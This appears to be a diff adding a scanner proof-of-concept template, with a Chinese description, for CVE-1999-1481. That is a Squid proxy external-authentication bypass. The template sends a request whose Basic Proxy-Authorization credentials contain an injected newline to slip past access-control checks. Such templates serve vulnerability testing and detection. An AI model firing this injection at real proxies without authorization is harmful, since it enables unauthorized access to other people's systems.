@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "验证 Squid Web Proxy 是否存在外部认证绕过漏洞。该漏洞源于 Squid 2.2.STABLE5 及更早版本在使用外部认证程序时，未正确处理用户名/密码对中的换行符，攻击者可在认证凭据中注入换行字符，绕过访问控制列表（ACL）检查，从而绕过身份验证获得未授权的代理访问权限。"
+id = "POC-AVE-1999-1128"
+name = "Squid Web Proxy 外部认证绕过漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-1999-1481",
+    "squid",
+    "auth-bypass",
+]
+vuln_id = [
+    "CVE-1999-1481",
+    "AVE-1999-1128",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Proxy-Authorization = 'Basic {{base64("user\ntest:password")}}'
+
+[[poc.requests.matchers]]
+expect = false
+status = [
+    200,
+    407,
+]
+type = "status"
